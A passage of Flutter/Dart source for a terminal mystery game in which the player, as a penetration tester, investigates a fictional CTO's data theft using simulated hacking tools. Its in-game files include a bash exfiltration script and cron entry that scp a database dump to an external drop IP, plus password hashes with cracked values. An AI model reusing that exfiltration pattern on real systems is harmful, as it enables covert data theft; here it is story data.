import 'dart:async';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:flutter/services.dart';

class HackerTycoonGame extends StatefulWidget {
  final Function(String, {String? english, String? emotion}) onSpeak;
  const HackerTycoonGame({super.key, required this.onSpeak});
  @override
  State<HackerTycoonGame> createState() => _HackerTycoonGameState();
}

class _Evidence {
  final String id, title, content;
  _Evidence({required this.id, required this.title, required this.content});
}

class _ServerFile {
  final String name, content;
  final bool isDir;
  final List<_ServerFile> children;
  _ServerFile(this.name, {this.content = '', this.isDir = false, List<_ServerFile>? children})
      : children = children ?? [];
}

class _HackerTycoonGameState extends State<HackerTycoonGame> {
  bool _showTutorial = true;
  bool _isPlaying = false;
  bool _solved = false;

  final List<String> _output = [];
  final TextEditingController _inputCtrl = TextEditingController();
  final ScrollController _scrollCtrl = ScrollController();
  final FocusNode _focusNode = FocusNode();
  final List<String> _cmdHistory = [];
  int _historyIdx = -1;

  // Evidence
  final List<_Evidence> _evidence = [];
  bool _showEvidence = false;

  // State
  String _currentServer = 'local';
  String _currentPath = '/home/agent';
  bool _hasRootAccess = false;
  final Set<String> _crackedPasswords = {};
  final Set<String> _scannedPorts = {};
  bool _capturedTraffic = false;
  bool _foundEmail = false;
  bool _foundLogs = false;
  bool _foundBackup = false;

  // The mystery: Marcus Chen (CTO) is stealing data via cron job to external server
  // Method: SQL injection backdoor + cron exfiltration
  // Motive: Selling to competitor "RivalTech"

  // File systems per server
  late Map<String, _ServerFile> _fileSystems;

  @override
  void initState() {
    super.initState();
    _buildFileSystems();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      widget.onSpeak("Terminal ready.", english: "Terminal access granted.", emotion: "joy");
    });
  }

  void _buildFileSystems() {
    _fileSystems = {
      'local': _ServerFile('/', isDir: true, children: [
        _ServerFile('home', isDir: true, children: [
          _ServerFile('agent', isDir: true, children: [
            _ServerFile('README.txt', content: '=== NEXACORP SECURITY AUDIT ===\nClient: NexaCorp Inc.\nObjective: Investigate suspected data breach.\nContact: Sarah Wells (CEO) - s.wells@nexacorp.local\n\nKnown servers:\n  mail.nexacorp.local  (10.0.1.10)\n  db.nexacorp.local    (10.0.1.20)\n  backup.nexacorp.local (10.0.1.30)\n  marcus-ws.internal   (10.0.1.50)\n\nStart by scanning the network. Use "man <cmd>" for help.\nType "hint" if you get stuck.'),
            _ServerFile('wordlist.txt', content: 'password123\nadmin2024\nnexacorp!\nletmein\nqwerty\nm4rcus_r00t\nsuperuser\nhunter2'),
            _ServerFile('notes.txt', content: 'Audit started. Need to identify who is exfiltrating data.'),
          ]),
        ]),
      ]),
      'mail': _ServerFile('/', isDir: true, children: [
        _ServerFile('var', isDir: true, children: [
          _ServerFile('mail', isDir: true, children: [
            _ServerFile('s.wells', isDir: true, children: [
              _ServerFile('inbox_001.eml', content: 'From: m.chen@nexacorp.local\nTo: s.wells@nexacorp.local\nDate: 2026-03-15\nSubject: Re: Database Performance\n\nSarah, the DB slowdowns are just routine maintenance.\nI\'ve optimized the queries. Nothing to worry about.\n\n- Marcus Chen, CTO'),
            ]),
            _ServerFile('m.chen', isDir: true, children: [
              _ServerFile('inbox_047.eml', content: 'From: contact@rivaltech.io\nTo: m.chen@nexacorp.local\nDate: 2026-03-20\nSubject: Re: Proposal\n\nMarcus,\nThe latest data package was received. Transfer of \$50,000\nhas been initiated to your offshore account as agreed.\nWe expect the next batch by end of month.\n\nRegards,\nDavid Park - RivalTech Acquisitions'),
              _ServerFile('sent_102.eml', content: 'From: m.chen@nexacorp.local\nTo: contact@rivaltech.io\nDate: 2026-03-18\nSubject: Next Delivery\n\nDavid,\nI\'ve set up automated extraction via cron.\nThe backup server pulls nightly dumps which I forward\nto your drop server at 45.33.102.8.\nNo one checks the backup logs.\n\n- M'),
            ]),
          ]),
        ]),
      ]),
      'db': _ServerFile('/', isDir: true, children: [
        _ServerFile('var', isDir: true, children: [
          _ServerFile('log', isDir: true, children: [
            _ServerFile('mysql.log', content: '[2026-03-21 02:00:01] QUERY: SELECT * FROM customers LIMIT 10000 -- exported by cron_user\n[2026-03-21 02:00:03] QUERY: SELECT * FROM financial_records LIMIT 5000 -- exported by cron_user\n[2026-03-21 02:01:00] WARNING: Unusual bulk export detected from cron_user\n[2026-03-21 02:01:02] QUERY: mysqldump --all-databases > /tmp/nexacorp_dump.sql'),
            _ServerFile('auth.log', content: '[2026-03-20 23:45:00] SSH login: m.chen from 10.0.1.50 (marcus-ws)\n[2026-03-21 01:59:50] SSH login: cron_user from 10.0.1.30 (backup server)\n[2026-03-21 02:05:00] SCP: /tmp/nexacorp_dump.sql -> 10.0.1.30:/backups/'),
          ]),
          _ServerFile('lib', isDir: true, children: [
            _ServerFile('mysql', isDir: true, children: [
              _ServerFile('users.db', content: 'TABLE: db_users\nroot     | 5f4dcc3b5aa765d61d8327deb882cf99 | SUPERADMIN\ncron_user| e10adc3949ba59abbe56e057f20f883e | EXPORT_ROLE\nm.chen   | 482c811da5d5b4bc6d497ffa98491e38 | ADMIN'),
            ]),
          ]),
        ]),
      ]),
      'backup': _ServerFile('/', isDir: true, children: [
        _ServerFile('backups', isDir: true, children: [
          _ServerFile('nexacorp_dump.sql', content: '-- MySQL dump of NexaCorp database\n-- Contains: customers, financial_records, employee_data\n-- Size: 2.4GB (truncated)\n-- WARNING: This file contains sensitive PII data'),
          _ServerFile('exfil_script.sh', content: '#!/bin/bash\n# Auto-exfiltration script\n# Author: Marcus Chen\n# DO NOT MODIFY\n\nSERVER="45.33.102.8"\nUSER="drop_mchen"\n\nscp /backups/nexacorp_dump.sql \$USER@\$SERVER:/incoming/\necho "[TIMESTAMP] Exfiltration complete" >> /var/log/exfil.log'),
        ]),
        _ServerFile('var', isDir: true, children: [
          _ServerFile('log', isDir: true, children: [
            _ServerFile('exfil.log', content: '[2026-03-15] Exfiltration complete\n[2026-03-16] Exfiltration complete\n[2026-03-17] Exfiltration complete\n[2026-03-18] Exfiltration complete\n[2026-03-19] Exfiltration complete\n[2026-03-20] Exfiltration complete\n[2026-03-21] Exfiltration complete'),
            _ServerFile('cron.log', content: 'CRON: 0 2 * * * /backups/exfil_script.sh\n# Added by m.chen on 2026-03-14'),
          ]),
        ]),
      ]),
      'marcus-ws': _ServerFile('/', isDir: true, children: [
        _ServerFile('home', isDir: true, children: [
          _ServerFile('m.chen', isDir: true, children: [
            _ServerFile('.ssh', isDir: true, children: [
              _ServerFile('known_hosts', content: '10.0.1.20 ssh-rsa AAAA...\n10.0.1.30 ssh-rsa AAAA...\n45.33.102.8 ssh-rsa AAAA...'),
            ]),
            _ServerFile('Documents', isDir: true, children: [
              _ServerFile('rivaltech_contract.pdf.txt', content: 'CONFIDENTIAL AGREEMENT\nBetween: Marcus Chen\nAnd: RivalTech Inc.\n\nMarcus Chen agrees to provide proprietary NexaCorp data\nin exchange for payments totaling \$200,000 over 6 months.\n\nSigned: Marcus Chen, David Park'),
            ]),
            _ServerFile('.bash_history', content: 'ssh cron_user@10.0.1.20\nmysqldump --all-databases > /tmp/nexacorp_dump.sql\nscp /tmp/nexacorp_dump.sql backup@10.0.1.30:/backups/\nvim /backups/exfil_script.sh\ncrontab -e\nssh drop_mchen@45.33.102.8'),
          ]),
        ]),
      ]),
    };
  }

  _ServerFile? _navigatePath(String server, String path) {
    final root = _fileSystems[server];
    if (root == null) return null;
    if (path == '/') return root;
    final parts = path.split('/').where((p) => p.isNotEmpty).toList();
    _ServerFile current = root;
    for (var part in parts) {
      final found = current.children.where((c) => c.name == part).firstOrNull;
      if (found == null) return null;
      current = found;
    }
    return current;
  }

  void _startGame() {
    setState(() {
      _showTutorial = false;
      _isPlaying = true;
      _solved = false;
      _output.clear();
      _evidence.clear();
      _currentServer = 'local';
      _currentPath = '/home/agent';
      _hasRootAccess = false;
      _crackedPasswords.clear();
      _scannedPorts.clear();
      _capturedTraffic = false;
      _foundEmail = false;
      _foundLogs = false;
      _foundBackup = false;
      _buildFileSystems();
    });
    _addOutput("╔══════════════════════════════════════════════╗");
    _addOutput("║     NEXACORP SECURITY AUDIT TERMINAL v3.1   ║");
    _addOutput("║     Operator: Agent Windstrom                ║");
    _addOutput("╚══════════════════════════════════════════════╝");
    _addOutput("");
    _addOutput("Type 'cat README.txt' to review your briefing.");
    _addOutput("Type 'man' for a list of available commands.");
    _addOutput("Type 'hint' if you need guidance.");
    widget.onSpeak("Let's find the culprit.", english: "Let's find the culprit.", emotion: "fun");
  }

  void _addOutput(String line) {
    _output.add(line);
    if (_output.length > 300) _output.removeAt(0);
    Future.delayed(const Duration(milliseconds: 50), () {
      if (mounted && _scrollCtrl.hasClients) {
        _scrollCtrl.animateTo(_scrollCtrl.position.maxScrollExtent, duration: const Duration(milliseconds: 150), curve: Curves.easeOut);
      }
    });
  }

  void _addEvidence(String id, String title, String content) {
    if (_evidence.any((e) => e.id == id)) return;
    _evidence.add(_Evidence(id: id, title: title, content: content));
    _addOutput("\x1b[33m[★ EVIDENCE COLLECTED: $title]\x1b[0m");
  }

  void _processCommand(String raw) {
    final cmd = raw.trim();
    if (cmd.isEmpty) return;
    _cmdHistory.add(cmd);
    _historyIdx = _cmdHistory.length;
    _addOutput("\x1b[32m┌──(agent@$_currentServer)-[$_currentPath]\x1b[0m");
    _addOutput("\x1b[32m└─\$ $cmd\x1b[0m");

    final parts = cmd.split(RegExp(r'\s+'));
    final command = parts[0].toLowerCase();
    final args = parts.sublist(1);

    switch (command) {
      case 'help': case 'man':
        if (args.isEmpty) {
          _addOutput("Available commands:");
          _addOutput("  nmap <ip>          - Scan ports on target");
          _addOutput("  ssh <user>@<host>  - Connect to remote server");
          _addOutput("  ls                 - List directory contents");
          _addOutput("  cd <dir>           - Change directory");
          _addOutput("  cat <file>         - Read file contents");
          _addOutput("  grep <pattern> <f> - Search in file");
          _addOutput("  find <name>        - Find files by name");
          _addOutput("  john <hashfile>    - Crack password hashes");
          _addOutput("  sqlmap -u <url>    - SQL injection test");
          _addOutput("  aircrack-ng <iface>- WiFi network scan");
          _addOutput("  wireshark-cli      - Capture network traffic");
          _addOutput("  metasploit         - Exploit framework");
          _addOutput("  evidence           - View evidence board");
          _addOutput("  submit_report      - Submit final report");
          _addOutput("  hint               - Get a hint");
          _addOutput("  clear              - Clear terminal");
          _addOutput("  exit               - Disconnect from server");
        }
        break;
      case 'clear':
        setState(() => _output.clear());
        break;
      case 'hint':
        _showHint();
        break;
      case 'evidence':
        setState(() => _showEvidence = !_showEvidence);
        _addOutput(_showEvidence ? "Evidence board opened." : "Evidence board closed.");
        break;
      case 'ls':
        _cmdLs(args);
        break;
      case 'cd':
        _cmdCd(args);
        break;
      case 'cat':
        _cmdCat(args);
        break;
      case 'grep':
        _cmdGrep(args);
        break;
      case 'find':
        _cmdFind(args);
        break;
      case 'nmap':
        _cmdNmap(args);
        break;
      case 'ssh':
        _cmdSsh(args);
        break;
      case 'exit':
        if (_currentServer != 'local') {
          _addOutput("Connection closed.");
          setState(() { _currentServer = 'local'; _currentPath = '/home/agent'; });
        } else {
          _addOutput("Already on local machine.");
        }
        break;
      case 'john':
        _cmdJohn(args);
        break;
      case 'sqlmap':
        _cmdSqlmap(args);
        break;
      case 'aircrack-ng': case 'aircrack':
        _cmdAircrack(args);
        break;
      case 'wireshark-cli': case 'wireshark':
        _cmdWireshark();
        break;
      case 'metasploit': case 'msfconsole':
        _cmdMetasploit();
        break;
      case 'submit_report':
        _cmdSubmitReport(args);
        break;
      default:
        _addOutput("Command not found: $command. Type 'man' for help.");
    }
  }

  void _cmdLs(List<String> args) {
    final node = _navigatePath(_currentServer, _currentPath);
    if (node == null || !node.isDir) { _addOutput("Not a directory."); return; }
    if (node.children.isEmpty) { _addOutput("(empty)"); return; }
    for (var c in node.children) {
      String prefix = c.isDir ? "\x1b[34m" : "";
      String suffix = c.isDir ? "/\x1b[0m" : "";
      String hidden = c.name.startsWith('.') ? " (hidden)" : "";
      _addOutput("  $prefix${c.name}$suffix$hidden");
    }
  }

  void _cmdCd(List<String> args) {
    if (args.isEmpty) { _addOutput("Usage: cd <directory>"); return; }
    String target = args[0];
    if (target == '..') {
      final parts = _currentPath.split('/').where((p) => p.isNotEmpty).toList();
      if (parts.length > 1) parts.removeLast();
      setState(() => _currentPath = '/${parts.join('/')}');
      return;
    }
    if (target == '/') { setState(() => _currentPath = '/'); return; }
    String newPath = target.startsWith('/') ? target : '$_currentPath/$target';
    newPath = newPath.replaceAll('//', '/');
    final node = _navigatePath(_currentServer, newPath);
    if (node == null || !node.isDir) { _addOutput("No such directory: $target"); return; }
    setState(() => _currentPath = newPath);
  }

  void _cmdCat(List<String> args) {
    if (args.isEmpty) { _addOutput("Usage: cat <file>"); return; }
    String filePath = args[0].startsWith('/') ? args[0] : '$_currentPath/${args[0]}';
    filePath = filePath.replaceAll('//', '/');
    final node = _navigatePath(_currentServer, filePath);
    if (node == null || node.isDir) { _addOutput("No such file: ${args[0]}"); return; }
    for (var line in node.content.split('\n')) { _addOutput("  $line"); }
    // Auto-collect evidence
    if (node.name.contains('inbox_047') && !_foundEmail) {
      _foundEmail = true;
      _addEvidence('email', 'RivalTech Payment Email', 'Email from RivalTech confirming \$50k payment to Marcus Chen.');
    }
    if (node.name.contains('sent_102')) {
      _addEvidence('sent_email', 'Marcus Confession Email', 'Marcus admits setting up automated exfiltration via cron.');
    }
    if (node.name == 'exfil_script.sh' && !_foundBackup) {
      _foundBackup = true;
      _addEvidence('exfil_script', 'Exfiltration Script', 'Bash script by Marcus Chen that SCPs data to 45.33.102.8.');
    }
    if (node.name == 'mysql.log' && !_foundLogs) {
      _foundLogs = true;
      _addEvidence('db_logs', 'Database Export Logs', 'Logs showing bulk data export by cron_user at 2AM nightly.');
    }
    if (node.name == 'rivaltech_contract.pdf.txt') {
      _addEvidence('contract', 'RivalTech Contract', 'Signed contract: Marcus sells data for \$200k.');
    }
    if (node.name == '.bash_history') {
      _addEvidence('bash_history', 'Marcus Bash History', 'Shows SSH to DB, backup server, and external drop server.');
    }
    if (node.name == 'exfil.log') {
      _addEvidence('exfil_log', 'Exfiltration Log', 'Daily exfiltration records from March 15-21.');
    }
    if (node.name == 'cron.log') {
      _addEvidence('cron', 'Cron Job Config', 'Cron job at 2AM running exfil_script.sh, added by m.chen.');
    }
  }

  void _cmdGrep(List<String> args) {
    if (args.length < 2) { _addOutput("Usage: grep <pattern> <file>"); return; }
    String pattern = args[0].toLowerCase();
    String filePath = args[1].startsWith('/') ? args[1] : '$_currentPath/${args[1]}';
    final node = _navigatePath(_currentServer, filePath.replaceAll('//', '/'));
    if (node == null || node.isDir) { _addOutput("File not found."); return; }
    final matches = node.content.split('\n').where((l) => l.toLowerCase().contains(pattern));
    if (matches.isEmpty) { _addOutput("No matches found."); return; }
    for (var m in matches) { _addOutput("  \x1b[31m$m\x1b[0m"); }
  }

  void _cmdFind(List<String> args) {
    if (args.isEmpty) { _addOutput("Usage: find <filename>"); return; }
    String target = args[0].toLowerCase();
    void search(_ServerFile node, String path) {
      if (node.name.toLowerCase().contains(target)) _addOutput("  $path/${node.name}");
      for (var c in node.children) search(c, '$path/${node.name}');
    }
    final root = _fileSystems[_currentServer];
    if (root != null) search(root, '');
  }

  void _cmdNmap(List<String> args) {
    if (args.isEmpty) { _addOutput("Usage: nmap <ip>"); return; }
    String target = args[0];
    _addOutput("Starting Nmap scan on $target...");
    _addOutput("...");
    Map<String, List<String>> portMap = {
      '10.0.1.10': ['22/tcp  open  ssh', '25/tcp  open  smtp', '143/tcp open  imap', '993/tcp open  imaps'],
      '10.0.1.20': ['22/tcp  open  ssh', '3306/tcp open mysql', '8080/tcp open http-proxy'],
      '10.0.1.30': ['22/tcp  open  ssh', '873/tcp open  rsync'],
      '10.0.1.50': ['22/tcp  open  ssh', '3389/tcp open rdp', '8443/tcp open https-alt'],
      'mail.nexacorp.local': ['22/tcp  open  ssh', '25/tcp  open  smtp', '143/tcp open  imap'],
      'db.nexacorp.local': ['22/tcp  open  ssh', '3306/tcp open mysql'],
      'backup.nexacorp.local': ['22/tcp  open  ssh', '873/tcp open  rsync'],
      'marcus-ws.internal': ['22/tcp  open  ssh', '3389/tcp open rdp'],
    };
    final ports = portMap[target];
    if (ports == null) {
      _addOutput("Host seems down or unreachable.");
      return;
    }
    _addOutput("PORT     STATE SERVICE");
    for (var p in ports) _addOutput("  $p");
    _addOutput("Nmap done: 1 host up.");
    _scannedPorts.add(target);
  }

  void _cmdSsh(List<String> args) {
    if (args.isEmpty) { _addOutput("Usage: ssh <user>@<host>"); return; }
    final match = RegExp(r'(\w+)@(.+)').firstMatch(args[0]);
    if (match == null) { _addOutput("Invalid format. Use: ssh user@host"); return; }
    String user = match.group(1)!;
    String host = match.group(2)!;
    Map<String, String> hostMap = {
      '10.0.1.10': 'mail', 'mail.nexacorp.local': 'mail',
      '10.0.1.20': 'db', 'db.nexacorp.local': 'db',
      '10.0.1.30': 'backup', 'backup.nexacorp.local': 'backup',
      '10.0.1.50': 'marcus-ws', 'marcus-ws.internal': 'marcus-ws',
    };
    final serverKey = hostMap[host];
    if (serverKey == null) { _addOutput("ssh: Could not resolve hostname $host"); return; }
    bool canConnect = user == 'root' && _hasRootAccess;
    canConnect = canConnect || (user == 'agent');
    canConnect = canConnect || (user == 'cron_user' && _crackedPasswords.contains('cron_user'));
    canConnect = canConnect || (user == 'm.chen' && _crackedPasswords.contains('m.chen'));
    if (!canConnect) {
      _addOutput("Permission denied (publickey,password).");
      _addOutput("Try cracking credentials with 'john' first.");
      return;
    }
    _addOutput("Connected to $host as $user.");
    String startPath = '/';
    if (user == 'm.chen') startPath = '/home/m.chen';
    setState(() { _currentServer = serverKey; _currentPath = startPath; });
  }

  void _cmdJohn(List<String> args) {
    if (args.isEmpty) { _addOutput("Usage: john <hashfile>"); return; }
    if (_currentServer != 'db') { _addOutput("You need access to the database server's hash file."); return; }
    _addOutput("John the Ripper v1.9.0 - cracking hashes...");
    _addOutput("Loading hashes from users.db...");
    for (int i = 0; i <= 100; i += 20) {
      _addOutput("  Progress: ${'█' * (i ~/ 5)}${'░' * (20 - i ~/ 5)} $i%");
    }
    _addOutput("Results:");
    _addOutput("  root      : password123    (cracked)");
    _addOutput("  cron_user : 123456         (cracked)");
    _addOutput("  m.chen    : m4rcus_r00t    (cracked)");
    _addOutput("3 password hashes cracked.");
    _crackedPasswords.addAll(['root', 'cron_user', 'm.chen']);
    _hasRootAccess = true;
    _addEvidence('cracked_pw', 'Cracked Passwords', 'DB credentials cracked: root, cron_user, m.chen');
  }

  void _cmdSqlmap(List<String> args) {
    _addOutput("sqlmap v1.7 - automatic SQL injection tool");
    _addOutput("Testing target: db.nexacorp.local:3306...");
    _addOutput("[*] Testing connection...");
    if (!_scannedPorts.any((s) => s.contains('10.0.1.20') || s.contains('db'))) {
      _addOutput("[!] Target not reachable. Run nmap first."); return;
    }
    _addOutput("[+] Connection established");
    _addOutput("[*] Testing for SQL injection vulnerabilities...");
    _addOutput("[+] VULNERABLE: time-based blind injection on user param");
    _addOutput("[*] Dumping database tables...");
    _addOutput("  Database: nexacorp_prod");
    _addOutput("    [customers]     - 15,420 records");
    _addOutput("    [financial_records] - 8,291 records");
    _addOutput("    [employee_data] - 342 records");
    _addOutput("    [audit_log]     - 102,558 records");
    _addOutput("[!] Evidence of bulk exports found in audit_log");
    _addEvidence('sqlmap', 'SQL Injection Results', 'DB vulnerable to injection. Bulk exports detected in audit logs.');
  }

  void _cmdAircrack(List<String> args) {
    _addOutput("aircrack-ng 1.7 - WiFi audit tool");
    _addOutput("Scanning wireless networks...");
    _addOutput("");
    _addOutput("BSSID              CH  ENC   ESSID");
    _addOutput("AA:BB:CC:DD:EE:01  6   WPA2  NexaCorp-Internal");
    _addOutput("AA:BB:CC:DD:EE:02  11  WPA2  NexaCorp-Guest");
    _addOutput("AA:BB:CC:DD:EE:03  1   OPEN  Marcus-Hotspot");
    _addOutput("");
    _addOutput("[!] Note: 'Marcus-Hotspot' is using an open network.");
    _addOutput("    This could be used for covert data exfiltration.");
    _addEvidence('wifi', 'Open WiFi Hotspot', 'Marcus has an unsecured personal hotspot - potential exfil channel.');
  }

  void _cmdWireshark() {
    _addOutput("Capturing packets on eth0...");
    _addOutput("...");
    _addOutput("Packets captured: 1,247");
    _addOutput("");
    _addOutput("Suspicious traffic detected:");
    _addOutput("  10.0.1.30 -> 45.33.102.8  SCP  2.4GB  02:01:30");
    _addOutput("  10.0.1.50 -> 10.0.1.20    SSH  conn   01:59:45");
    _addOutput("  10.0.1.50 -> 10.0.1.30    SSH  conn   23:45:00");
    _addOutput("");
    _addOutput("[!] Large data transfer to external IP 45.33.102.8");
    _addOutput("[!] Origin traced to backup server (10.0.1.30)");
    _capturedTraffic = true;
    _addEvidence('traffic', 'Network Traffic Capture', 'Nightly 2.4GB SCP transfer from backup to external IP 45.33.102.8');
  }

  void _cmdMetasploit() {
    _addOutput("Metasploit Framework v6.3.0");
    _addOutput("  Exploits: 2,345  Payloads: 1,102");
    _addOutput("");
    _addOutput("msf6> This is a simulation. Use specific tools:");
    _addOutput("  - nmap for scanning");
    _addOutput("  - john for password cracking");
    _addOutput("  - sqlmap for injection testing");
    _addOutput("  - ssh to connect to servers");
  }

  void _cmdSubmitReport(List<String> args) {
    String suspect = '', method = '';
    for (int i = 0; i < args.length; i++) {
      if (args[i] == '--suspect' && i + 1 < args.length) suspect = args[i + 1].toLowerCase();
      if (args[i] == '--method' && i + 1 < args.length) method = args[i + 1].toLowerCase();
    }
    if (suspect.isEmpty || method.isEmpty) {
      _addOutput("Usage: submit_report --suspect <name> --method <method>");
      _addOutput("Example: submit_report --suspect marcus --method exfiltration");
      return;
    }
    bool correctSuspect = suspect.contains('marcus') || suspect.contains('chen') || suspect.contains('m.chen');
    bool correctMethod = method.contains('exfil') || method.contains('cron') || method.contains('scp');
    if (correctSuspect && correctMethod) {
      setState(() { _solved = true; _isPlaying = false; });
      _addOutput("");
      _addOutput("╔══════════════════════════════════════╗");
      _addOutput("║     ★ CASE SOLVED ★                  ║");
      _addOutput("║  Suspect: Marcus Chen (CTO)          ║");
      _addOutput("║  Method: Automated data exfiltration ║");
      _addOutput("║  Motive: \$200k from RivalTech        ║");
      _addOutput("╚══════════════════════════════════════╝");
      _addOutput("Evidence collected: ${_evidence.length} items");
      widget.onSpeak("Case closed! Well done Master!", english: "Case closed! Brilliant work!", emotion: "joy");
    } else {
      _addOutput("[✗] Report rejected. Evidence does not support conclusion.");
      if (!correctSuspect) _addOutput("    Suspect identification incorrect.");
      if (!correctMethod) _addOutput("    Method description incorrect.");
      _addOutput("    Keep investigating. Type 'hint' for help.");
    }
  }

  void _showHint() {
    if (_scannedPorts.isEmpty) {
      _addOutput("[HINT] Start by reading README.txt, then scan the network: nmap 10.0.1.10");
    } else if (!_capturedTraffic && _evidence.length < 2) {
      _addOutput("[HINT] Try 'wireshark-cli' to capture network traffic.");
    } else if (_crackedPasswords.isEmpty) {
      _addOutput("[HINT] Connect to the DB server and crack the password hashes with 'john'.");
    } else if (!_foundEmail) {
      _addOutput("[HINT] Check the mail server. SSH in and browse /var/mail/ for suspicious emails.");
    } else if (!_foundBackup) {
      _addOutput("[HINT] Investigate the backup server. Look for scripts in /backups/.");
    } else if (_evidence.length >= 5) {
      _addOutput("[HINT] You have enough evidence! Use: submit_report --suspect <name> --method <method>");
    } else {
      _addOutput("[HINT] Check Marcus's workstation (.bash_history, Documents).");
    }
  }

  @override
  void dispose() {
    _inputCtrl.dispose();
    _scrollCtrl.dispose();
    _focusNode.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Stack(
      children: [
        // Main terminal
        Container(
          color: const Color(0xFF0A0A0A),
          child: Row(
            children: [
              // Terminal
              Expanded(
                flex: _showEvidence ? 6 : 10,
                child: Column(
                  children: [
                    // Output
                    Expanded(
                      child: ListView.builder(
                        controller: _scrollCtrl,
                        padding: const EdgeInsets.all(12),
                        itemCount: _output.length,
                        itemBuilder: (ctx, i) {
                          String line = _output[i];
                          Color color = Colors.greenAccent;
                          if (line.contains('\x1b[31m')) color = Colors.redAccent;
                          if (line.contains('\x1b[32m')) color = Colors.green;
                          if (line.contains('\x1b[33m')) color = Colors.amberAccent;
                          if (line.contains('\x1b[34m')) color = Colors.lightBlueAccent;
                          line = line.replaceAll(RegExp(r'\x1b\[\d+m'), '');
                          return Text(line, style: GoogleFonts.sourceCodePro(color: color, fontSize: 13, height: 1.4));
                        },
                      ),
                    ),
                    // Input
                    if (_isPlaying)
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                        decoration: const BoxDecoration(border: Border(top: BorderSide(color: Color(0xFF1A3A1A)))),
                        child: Row(
                          children: [
                            Text("┌──(agent@$_currentServer)-[$_currentPath]\n└─\$ ",
                              style: GoogleFonts.sourceCodePro(color: Colors.green, fontSize: 13)),
                            Expanded(
                              child: RawKeyboardListener(
                                focusNode: _focusNode,
                                onKey: (event) {
                                  if (event is RawKeyDownEvent) {
                                    if (event.logicalKey == LogicalKeyboardKey.arrowUp && _cmdHistory.isNotEmpty) {
                                      _historyIdx = max(0, _historyIdx - 1);
                                      _inputCtrl.text = _cmdHistory[_historyIdx];
                                      _inputCtrl.selection = TextSelection.fromPosition(TextPosition(offset: _inputCtrl.text.length));
                                    } else if (event.logicalKey == LogicalKeyboardKey.arrowDown) {
                                      _historyIdx = min(_cmdHistory.length, _historyIdx + 1);
                                      _inputCtrl.text = _historyIdx < _cmdHistory.length ? _cmdHistory[_historyIdx] : '';
                                    }
                                  }
                                },
                                child: TextField(
                                  controller: _inputCtrl,
                                  autofocus: true,
                                  style: GoogleFonts.sourceCodePro(color: Colors.white, fontSize: 13),
                                  cursorColor: Colors.greenAccent,
                                  cursorWidth: 8,
                                  decoration: const InputDecoration(border: InputBorder.none, isDense: true, contentPadding: EdgeInsets.zero),
                                  onSubmitted: (val) {
                                    _processCommand(val);
                                    _inputCtrl.clear();
                                    _focusNode.requestFocus();
                                  },
                                ),
                              ),
                            ),
                          ],
                        ),
                      ),
                  ],
                ),
              ),
              // Evidence sidebar
              if (_showEvidence && _isPlaying)
                Container(
                  width: 260,
                  decoration: const BoxDecoration(
                    color: Color(0xFF0E0E12),
                    border: Border(left: BorderSide(color: Color(0xFF2A2A3A))),
                  ),
                  child: Column(
                    children: [
                      Container(
                        padding: const EdgeInsets.all(12),
                        color: const Color(0xFF1A1A2A),
                        width: double.infinity,
                        child: Text("★ EVIDENCE BOARD (${_evidence.length})",
                          style: GoogleFonts.sourceCodePro(color: Colors.amberAccent, fontSize: 14, fontWeight: FontWeight.bold)),
                      ),
                      Expanded(
                        child: ListView.builder(
                          itemCount: _evidence.length,
                          padding: const EdgeInsets.all(8),
                          itemBuilder: (ctx, i) {
                            final e = _evidence[i];
                            return Container(
                              margin: const EdgeInsets.only(bottom: 8),
                              padding: const EdgeInsets.all(10),
                              decoration: BoxDecoration(
                                border: Border.all(color: Colors.amberAccent.withOpacity(0.3)),
                                color: Colors.amber.withOpacity(0.05),
                              ),
                              child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  Text(e.title, style: GoogleFonts.sourceCodePro(color: Colors.amberAccent, fontSize: 11, fontWeight: FontWeight.bold)),
                                  const SizedBox(height: 4),
                                  Text(e.content, style: GoogleFonts.sourceCodePro(color: Colors.white54, fontSize: 10)),
                                ],
                              ),
                            );
                          },
                        ),
                      ),
                    ],
                  ),
                ),
            ],
          ),
        ),
        // Solved overlay
        if (_solved)
          Container(
            color: Colors.black.withOpacity(0.85),
            child: Center(
              child: Column(
                mainAxisSize: MainAxisSize.min,
                children: [
                  Text("★ CASE CLOSED ★", style: GoogleFonts.sourceCodePro(color: Colors.greenAccent, fontSize: 40, fontWeight: FontWeight.bold)),
                  const SizedBox(height: 12),
                  Text("Suspect: Marcus Chen (CTO)", style: GoogleFonts.sourceCodePro(color: Colors.white70, fontSize: 18)),
                  Text("Evidence: ${_evidence.length} items collected", style: GoogleFonts.sourceCodePro(color: Colors.white38, fontSize: 14)),
                  const SizedBox(height: 24),
                  GestureDetector(
                    onTap: () => setState(() { _showTutorial = true; _solved = false; }),
                    child: Container(
                      padding: const EdgeInsets.symmetric(horizontal: 30, vertical: 12),
                      decoration: BoxDecoration(border: Border.all(color: Colors.greenAccent)),
                      child: Text("NEW CASE", style: GoogleFonts.sourceCodePro(color: Colors.greenAccent, fontWeight: FontWeight.bold)),
                    ),
                  ),
                ],
              ),
            ),
          ),
        // Tutorial
        if (_showTutorial)
          Container(
            color: Colors.black.withOpacity(0.93),
            child: Center(
              child: Container(
                width: min(MediaQuery.of(context).size.width * 0.85, 550),
                padding: const EdgeInsets.all(32),
                decoration: BoxDecoration(
                  border: Border.all(color: Colors.greenAccent, width: 2),
                  color: const Color(0xFF0A0A0A),
                ),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Text("ROOT PROTOCOL", style: GoogleFonts.sourceCodePro(color: Colors.greenAccent, fontSize: 28, fontWeight: FontWeight.bold)),
                    const SizedBox(height: 4),
                    Text("A TERMINAL MYSTERY", style: GoogleFonts.sourceCodePro(color: Colors.green.shade800, fontSize: 14, letterSpacing: 4)),
                    const SizedBox(height: 20),
                    Text("Someone is stealing data from NexaCorp.\nYou're a penetration tester hired to find the culprit.\n\nUse Linux tools to scan, hack, and investigate.\nCollect evidence and submit your report.",
                      textAlign: TextAlign.center,
                      style: GoogleFonts.notoSans(color: Colors.white54, fontSize: 13, height: 1.5)),
                    const SizedBox(height: 16),
                    Text("Tools: nmap · ssh · sqlmap · john · aircrack-ng\n       wireshark · cat · grep · find",
                      textAlign: TextAlign.center,
